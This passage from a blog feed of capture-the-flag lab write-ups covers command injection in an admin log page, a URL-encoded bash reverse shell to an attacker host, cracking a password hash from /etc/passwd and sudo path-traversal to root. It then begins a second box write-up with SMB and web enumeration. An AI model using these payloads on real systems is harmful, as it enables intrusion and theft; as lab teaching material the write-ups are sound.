
&lt;h4 id=&quot;command-injection&quot;&gt;&lt;strong&gt;Command Injection&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Navigating around the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Admin area&lt;/code&gt;, we realize that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin/dashboard.php?page=log&lt;/code&gt; is vulnerable to &lt;strong&gt;command injection&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Let’s us send a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; request and further inspect the result.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;file=log_01.txt;id&apos;&lt;/span&gt; http://192.168.62.101/admin/dashboard.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;log &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh&quot;&lt;/span&gt;
...
Contenu &lt;span class=&quot;nb&quot;&gt;du &lt;/span&gt;fichier log_01.txt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; :  &amp;lt;/br&amp;gt;&amp;lt;PRE&amp;gt;Operation: password change
Date: January 03, 2020 / 11:25 a.m.
User: admin
Status: OK
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; command is nicely executed on the other end as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;initial-access&quot;&gt;&lt;strong&gt;Initial Access&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Now, we can pull a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt; reverse shell. Our payload might look as below.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash -c &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.49.62/80 0&amp;gt;&amp;amp;1&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s always a good idea to URL-encode the payload.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.49.62%2F80+0%3E%261%22
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The final &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; command.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;file=log_01.txt;bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.49.62%2F80+0%3E%261%22&apos;&lt;/span&gt; http://192.168.62.101/admin/dashboard.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;log &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a second, our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; should catch the reverse connection at port 80 as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 80
Listening on 0.0.0.0 80
Connection received on 192.168.62.101 50576
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;832&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
www-data@serv:/var/www/html/admin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;shell-as-webadmin&quot;&gt;&lt;strong&gt;Shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webadmin&lt;/code&gt;&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Locally gather the target system divulges a password hash of a local user inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@serv:/var/www/html/admin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
webadmin:&lt;span class=&quot;nv&quot;&gt;$1$webadmin$3sXBxGUtDGIFAcnNTNhi6&lt;/span&gt;/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The hash can then be cracked with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; 
...
Press &lt;span class=&quot;s1&quot;&gt;&apos;q&apos;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
dragon           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
1g 0:00:00:00 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2021-09-04 09:42&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 5.263g/s 2021p/s 2021c/s 2021C/s 123456..michael1
Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our new credentials is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webadmin:dragon&lt;/code&gt;. With this credentials, we can drop a new shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webadmin&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;sudo-abusing&quot;&gt;&lt;strong&gt;SUDO Abusing&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webadmin&lt;/code&gt; can run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo /bin/nice ...&lt;/code&gt; command as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;webadmin@serv:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;webadmin: dragon

Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;webadmin on serv:
    env_reset, mail_badpass,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User webadmin may run the following commands on serv:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL : ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; /bin/nice /notes/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s worth noticing that we can hijack the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nice&lt;/code&gt; command to execute any binary of our choice by injecting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../&lt;/code&gt; pointer to escape the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/notes&lt;/code&gt; directory.&lt;/p&gt;

&lt;p&gt;To demonstrate the idea, let’s us execute the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; binary and obtain the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; shell.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;webadmin@serv:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /bin/nice /notes/../../bin/bash
root@serv:/home/webadmin# &lt;span class=&quot;nb&quot;&gt;id  
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="ctf" /><category term="pg" /><category term="linux" /><summary type="html">Summary We’ll exploit the weakness in PHP strcmp employed in a login prompt of an admin page. After bypass the login, we can secure the initial access via the Command Injection vulnerability of the page parameter. Privilege escalation can be procured with a misconfigured sudo command.</summary></entry><entry><title type="html">Photographer - OSPG</title><link href="https://jayngng.github.io/blog/photographer-ospg/" rel="alternate" type="text/html" title="Photographer - OSPG" /><published>2021-09-03T22:12:45+10:00</published><updated>2021-09-03T22:12:45+10:00</updated><id>https://jayngng.github.io/blog/photographer---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/photographer-ospg/">&lt;h1 id=&quot;summary-of-result&quot;&gt;&lt;strong&gt;Summary of Result&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;With a valid credetials acquired from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; service, we attain the initial foothold by exploiting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authenticated Remote Code Execution&lt;/code&gt; (RCE) of the vulnerable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Koken CMS&lt;/code&gt;. We then escalate our privilege by abusing a &lt;strong&gt;misconfigured&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUID binary&lt;/code&gt; and successfully compromise &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; access.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We’ll begin with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:    
|   2048 41:4d:aa:18:86:94:8e:88:a7:4c:6b:42:60:76:f1:4f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;          
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCq9GoYsvJTOUcsgHSES9+20Ix4Q8wjm5slMheJ2ME+COokAqxBzXSr458KBmHv3bsTLWAH9FxoXJ6zrzDPmPApcqVifB4aI9l/VYxoeJCj54kKIQlCKkWTZjsAeLBI2Lk2+yJLLFWPTAZ2htwRAwCl
9z8YV3xgtqhTa+5BqIm/GInW4PYV0zi9zOMn2g4jNSWvy91FBUboGLwVgNYslGBydNW8Fhz8X/LXHZ1x6ulA76W026VEGOiQfoiIi84IFi9CbP8GIKfQ7BHuDlMqgiN9+w7K0z0oFdtiFhAS/48w89MYn6UOzw7Aaa9eLQi0+zxpW5SpCpw0mC2euzPxow
2Z
|   256 4d:a3:d0:7a:8f:64:ef:82:45:2d:01:13:18:b7:e0:13 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMz4UG2gfu7L/Lxcqek1pZf46d8SocbES1A2a/XUYQgTmIqJuCEpLf3ERgVXS+7Lwdi6+F3xkI/lYFCA5MkRUQA&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
|   256 1a:01:7a:4f:cf:95:85:bf:31:a1:4f:15:87:ab:94:e2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDL5ZwzA5dpqtWx4ZzjVQ6NMzVUia8/We8txfiAn+mv4
80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
8000/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-generator: Koken 0.22.24            
| http-methods:      
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: daisa ahomi
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;→ There are a few running services. Within the scope of this writeup, we are interested in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB/445&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP/8000&lt;/code&gt; services.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;smb-enumeration&quot;&gt;&lt;strong&gt;SMB Enumeration&lt;/strong&gt;&lt;/h5&gt;
&lt;p&gt;Let’s us start listing shares utilizing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; without providing password.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
Enter WORKGROUP&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;oot&lt;span class=&quot;s1&quot;&gt;&apos;s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the result, we discover that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt; access is available for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sambashare&lt;/code&gt; share.&lt;/p&gt;

&lt;p&gt;Let’s us further drop an interactive shell in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sambashare&lt;/code&gt; by running the following command.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbclient &lt;span class=&quot;se&quot;&gt;\\\\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;sambashare
Enter WORKGROUP&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;oot&lt;span class=&quot;s1&quot;&gt;&apos;s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Thu Aug 20 11:51:08 2020
  ..                                  D        0  Thu Aug 20 12:08:59 2020
  mailsent.txt                        N      503  Mon Jul 20 21:29:40 2020
  wordpress.bkp.zip                   N 13930308  Mon Jul 20 21:22:23 2020

                3300080 blocks of size 1024. 2958792 blocks available
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are two files: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mailsent.txt&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wordpress.bkp.zip&lt;/code&gt;. To download them, from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; shell, we continue executing.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
                3300080 blocks of size 1024. 2958792 blocks available
smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; mget &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
Get file mailsent.txt? y
getting file &lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;ailsent.txt of size 503 as mailsent.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;245.6 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 245.6 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Get file wordpress.bkp.zip? y
getting file &lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;ordpress.bkp.zip of size 13930308 as wordpress.bkp.zip &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;183835.1 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 179004.0 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After those files are downloaded, let’s us inspect the content of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mailsent.txt&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;mailsent.txt 
...
To: Daisa Ahomi &amp;lt;daisa@photographer.com&amp;gt;
...
Hi Daisa!
Your site is ready now.
Don&lt;span class=&quot;s1&quot;&gt;&apos;t forget your secret, my babygirl ;)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here are some important info that we might notice:&lt;/p&gt;

&lt;p&gt;→ Potential email: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;daisa@photographer.com&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;→ Potential user: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;daisa&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;→ Potential pass: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;babygirl&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;http8000&quot;&gt;&lt;strong&gt;HTTP/8000&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Now, let’s us gather some hidden directories of the web application.&lt;/p&gt;

&lt;p&gt;This can be done with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://&lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;:8000/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; common.txt
admin                   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 321, Words: 20, Lines: 10]
app                     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 319, Words: 20, Lines: 10]
index.php               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 4603, Words: 206, Lines: 95]
server-status           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 403, Size: 280, Words: 20, Lines: 10]
storage                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 323, Words: 20, Lines: 10]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; appears to be compelling, navigate to the site, we discover that it’s running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Koken CMS 0.22.24&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.57.76:8000/admin/
...
        &amp;lt;title&amp;gt;Koken&amp;lt;/title&amp;gt;

        &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;css/console_0.22.24.min.css&quot;&lt;/span&gt; /&amp;gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Conducting a few additional researches, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Koken CMS&lt;/code&gt; is known to be vulnerable to &lt;strong&gt;Authenticated Arbitrary File Upload&lt;/strong&gt;.&lt;/p&gt;

